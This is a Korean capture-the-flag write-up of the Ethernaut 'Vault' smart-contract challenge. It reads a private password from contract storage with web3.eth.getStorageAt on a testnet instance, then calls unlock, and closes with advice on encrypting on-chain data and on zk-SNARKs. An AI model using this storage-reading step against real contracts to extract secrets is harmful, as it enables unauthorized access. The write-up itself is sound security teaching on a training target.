https://teberr.notion.site/Ethernaut-Vault-fbe7a13aa0ca4bcca089f064d3e0e4bc

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/640bd226-620b-4651-8685-7464aae0f568/Untitled.png)

> 이번 문제를 해결하기 위해서는 금고를 열어 주세요!
> 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

# 코드 분석 및 공격

Vault 컨트랙트의 잠금(locked)를 푸는 유일한 방법은 unlock 함수를 실행시키되 private 변수인 password값을 맞추는 방법 밖에는 없다.

![password 실패.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6d37edec-0db6-4edc-b1b7-32a20544f494/password_%EC%8B%A4%ED%8C%A8.png)

```jsx
await contract.locked()
true

await contract.password()
VM644:1 Uncaught TypeError: contract.password is not a function
    at <anonymous>:1:16
(anonymous) @ VM644:1

await contract.password
undefined
```

password값은 private으로 선언이 되어있기 때문에 인스턴스에서 password값을 불러오고자 하면 public인 locked와 다르게 불러올 수 없다.

솔리디티에서는 컨트랙트내에 선언하는 변수가 3가지의 종류가 존재하는데 상태변수,지역변수,전역변수이다. 

이 때 전역변수는 다른 언어와 조금 다른데, 블록체인 전체에서 쓰는 변수로 block.blockhash, block.number, msg.sender, msg.data, msg.value 등과 같이 따로 선언하지 않아도 블록체인에서 사용하기로 이미 약속되어 있는 변수들을 의미한다.

![전역변수.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fd71ba53-2575-4fdb-9ebf-1078865a709d/%EC%A0%84%EC%97%AD%EB%B3%80%EC%88%98.png)

우리가 일반적으로 아는 변수처럼 선언하고 사용하는 변수는 상태변수와 지역변수이다. 지역변수는 함수 내에서 선언되어 함수가 종료되면 사라지는 우리가 아는 평범한 지역변수이다.

상태변수는 컨트랙트의 저장소(storage)에 영구적으로 저장이되는 변수로 컨트랙트에 기록이 되는 변수이다. 여기서 문제가 생기는데 상태변수를 private으로 지정하였더라도 실제 컨트랙트의 storage의 접근하여 그 상태변수 값을 읽어낼 수 있다.   

 

[https://web3js.readthedocs.io/en/v1.5.2/web3-eth.html#getstorageat](https://web3js.readthedocs.io/en/v1.5.2/web3-eth.html#getstorageat) 에서 상태변수를 읽는 함수인 web3.eth.getStorageAt함수에 대한 사용법이 나와있다.

첫 번째로 선언한 상태변수가 locked이고 두번째로 선언한 상태변수가 password이므로 storage에 접근하여 두번째 저장된 값을 불러오면 password값을 알 수 있다.

```jsx
await web3.eth.getStorageAt("0x1941263C1c63eB5F15D3789720cdB1640483DAB7",0)
'0x0000000000000000000000000000000000000000000000000000000000000001'

await web3.eth.getStorageAt("0x1941263C1c63eB5F15D3789720cdB1640483DAB7",1)
'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'

await web3.eth.getStorageAt("0x1941263C1c63eB5F15D3789720cdB1640483DAB7",2)
'0x0000000000000000000000000000000000000000000000000000000000000000'
```

첫번째 값(0)은 locked 상태 변수로 True이므로 1이 저장되어있고 

두번째 값(1)은 password 상태 변수 값이다.

세번째 값(2)은 선언도 저장도 안되어있으므로 0으로 아무것도 없는 것을 볼 수 있다.

password 값을 알았으니 이 값으로 unlock 함수를 호출하면 된다.

![unlock.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fab9568b-9387-4f2a-9203-6390d9c33918/unlock.png)

```jsx
await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
6dab102ee417c6c670be5febca39e425d7e07f6c.js:1 ⛏️ Sent transaction ⛏ https://goerli.etherscan.io/tx/0x56db705678c6ba57ef811864b4170cbf7fff578d5b8e34c91aec6ec4d5c3c03d
6dab102ee417c6c670be5febca39e425d7e07f6c.js:1 ⛏️ Mined transaction ⛏ https://goerli.etherscan.io/tx/0x56db705678c6ba57ef811864b4170cbf7fff578d5b8e34c91aec6ec4d5c3c03d
{tx: '0x56db705678c6ba57ef811864b4170cbf7fff578d5b8e34c91aec6ec4d5c3c03d', receipt: {…}, logs: Array(0)}

await contract.locked()
false
```

password값을 넣어서 unlock 함수를 실행시켜 주면 트랜잭션이 발생하고 트랜잭션이 confirmed 된 후 contract의 locked 상태 변수를 확인하면 false로 변한 것을 확인할 수 있다.

![클리어.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b742f618-bef2-4873-82bb-0bb44e586bdc/%ED%81%B4%EB%A6%AC%EC%96%B4.png)

즉 Vault 금고가 이제 잠겨있지 않으므로 인스턴스를 제출해주면 클리어된다.

# 문제 후기

private 변수는 외부 컨트랙트에서 접근하는 것만 막아준다는 점이 핵심이다. private으로 선언된 상태변수와 지역변수는 공개적으로 여전히 접근이 가능하다는 점을 잊어서는 안된다.

데이터 값자체를 private으로 보증하기 위해서는 블록체인에 올리기 전에 암호화를 필수적으로 진행해야 한다. 이런 경우 복호화 키는 체인위에 있으면 다른 사람들이 볼 수 있기 때문에 체인위에 있으면 안된다 . zk-SNARKs는 파라미터를 공개할 필요 없이 누군가가 비밀 파라미터를 가지고 있는지 판별하는 방법을 제공해준다. 

zk-SNARKs는  거래 자체를 증명하는 증명만 브로드캐스팅할 수 있게 해준다. 이를 이용하여 일종의 익명 인증이 가능한데 사용자가 자신의 신원 대신 자신이 소유한 사실을 근거로 하여 리소스에 접근할 수 있도록 허용됐음을 입증할 수 있게 된다. 이를 적용한 대표적인 코인이 익명성으로 유명한 Z캐시다.
